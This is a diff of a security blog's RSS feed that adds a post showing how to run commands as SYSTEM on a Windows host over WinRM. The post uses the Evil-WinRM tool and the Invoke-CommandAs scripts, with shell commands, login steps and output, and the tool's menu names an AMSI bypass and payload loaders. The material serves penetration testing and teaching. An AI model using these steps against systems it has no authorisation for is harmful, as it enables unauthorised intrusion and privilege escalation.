@@ -5,10 +5,79 @@
     <description>Recent content in psexec on malicious.link</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 14 Aug 2014 11:26:38 -0500</lastBuildDate>
+    <lastBuildDate>Sun, 13 Sep 2020 09:30:44 -0500</lastBuildDate>
     
         <atom:link href="https://malicious.link/tags/psexec/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Run as SYSTEM using Evil-WinRM</title>
+      <link>https://malicious.link/post/2020/run-as-system-using-evil-winrm/</link>
+      <pubDate>Sun, 13 Sep 2020 09:30:44 -0500</pubDate>
+      
+      <guid>https://malicious.link/post/2020/run-as-system-using-evil-winrm/</guid>
+      <description>&lt;p&gt;This is a quick blog post on how to elevate to SYSTEM without the need for PSEXEC when you are using PowerShell, or more specifcially in this case, PowerShell Remoting (WinRM).&lt;/p&gt;
+&lt;p&gt;First off, let me introduce my tool of choice here. It&amp;rsquo;s &lt;a href=&#34;https://github.com/Hackplayers/evil-winrm&#34;&gt;Evil-WinRM&lt;/a&gt;. I spoke about it in the Practical Exploitation video here: &lt;a href=&#34;https://www.youtube.com/watch?v=tVgJ-9FJKxE,&#34;&gt;https://www.youtube.com/watch?v=tVgJ-9FJKxE,&lt;/a&gt; so I won&amp;rsquo;t go too far indepth. It&amp;rsquo;s essentially the only WinRM tool that I&amp;rsquo;ve found to work well in a non-Windows native situation (also you can proxy it through proxychains which is AWESOME!!).&lt;/p&gt;
+&lt;p&gt;Anyways.&lt;/p&gt;
+&lt;p&gt;I want to document how to run commands as &lt;strong&gt;SYSTEM&lt;/strong&gt; without the use of PSEXEC. I found this technique on a &lt;a href=&#34;https://4sysops.com&#34;&gt;4sysops blog&lt;/a&gt; post called &lt;a href=&#34;https://4sysops.com/archives/running-powershell-remotely-as-system-with-invoke-commandas/&#34;&gt;Running PowerShell Remotely As System with Invoke-CommandAs&lt;/a&gt;. &lt;em&gt;Side-note&lt;/em&gt; you should definitely bookmark thier blog it&amp;rsquo;s great.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Invoke-CommandAs&lt;/strong&gt; is not a native function of PowerShell, so you need to download it from the original author&amp;rsquo;s Github repo: &lt;a href=&#34;https://github.com/mkellerman/Invoke-CommandAs&#34;&gt;https://github.com/mkellerman/Invoke-CommandAs&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;For our uses all you need to do is get these two particular files:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1&#34;&gt;https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1&#34;&gt;https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Here you can see me putting those two files into a &lt;code&gt;scripts&lt;/code&gt; directory I made inside of the Evil-WinRM folder. (&lt;code&gt;git clone https://github.com/Hackplayers/evil-winrm&lt;/code&gt; + &lt;code&gt;bundle install&lt;/code&gt;)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@attacker:~/evil-winrm/scripts# ls
+Invoke-CommandAs.ps1
+root@attacker:~/evil-winrm/scripts# wget https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke-
+--2020-09-13 20:17:56--  https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.200.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.200.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10009 (9.8K) [text/plain]
+Saving to: &#39;Invoke-ScheduledTask.ps1&#39;
+
+Invoke-ScheduledTask.ps1                      100%[===========================================================================================
+
+2020-09-13 20:17:56 (5.37 MB/s) - &#39;Invoke-ScheduledTask.ps1&#39; saved [10009/10009]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once that&amp;rsquo;s ready, I run Evil-WinRM with the &lt;code&gt;-s&lt;/code&gt; flag and specify the &lt;code&gt;scripts&lt;/code&gt; directory I put the two files in.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@attacker:~/evil-winrm# ruby evil-winrm.rb -i 192.168.80.10 -u uberuser -s scripts/
+Enter Password:
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once I have the shell I load each of the scripts by typing out their file names (tab complete should work)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt; Invoke-ScheduledTask.ps1
+*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt; Invoke-CommandAs.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once they are loaded you need to run the &lt;code&gt;menu&lt;/code&gt; command to load the functions into memory on the attackers side. I haven&amp;rsquo;t looked at the code enough to know exactly why this is needed, but it doesn&amp;rsquo;t seem to work if you don&amp;rsquo;t.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt; menu
+
+   ,.   (   .      )               &amp;quot;            ,.   (   .      )       .
+  (&amp;quot;  (  )  )&#39;     ,&#39;             (`     &#39;`    (&amp;quot;     )  )&#39;     ,&#39;   .  ,)
+.; )  &#39; (( (&amp;quot; )    ;(,      .     ;)  &amp;quot;  )&amp;quot;  .; )  &#39; (( (&amp;quot; )   );(,   )((
+_&amp;quot;.,_,.__).,) (.._( ._),     )  , (._..( &#39;.._&amp;quot;._, . &#39;._)_(..,_(_&amp;quot;.) _( _&#39;)
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
+ |    __)_\  \/ /  |  |    ;_)_&#39;) \   \/\/   /  |/    \|       _/ /  \ /  \
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers
+
+[+] Bypass-4MSI
+[+] Dll-Loader
+[+] Donut-Loader
+[+] Invoke-Binary
+[+] Invoke-CommandAs
+[+] Invoke-ScheduledTask
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As we can see both of the needed functions are loaded and we can finally issue our commands as SYSTEM with the &lt;code&gt;-AsSystem&lt;/code&gt; flag and the command being &lt;code&gt;whoami&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt; Invoke-CommandAs -ScriptBlock {whoami} -AsSystem
+nt authority\system
+*Evil-WinRM* PS C:\Users\uberuser\Documents&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
     
     <item>
       <title>Milkman: Creating processes as any currently logged in user</title>
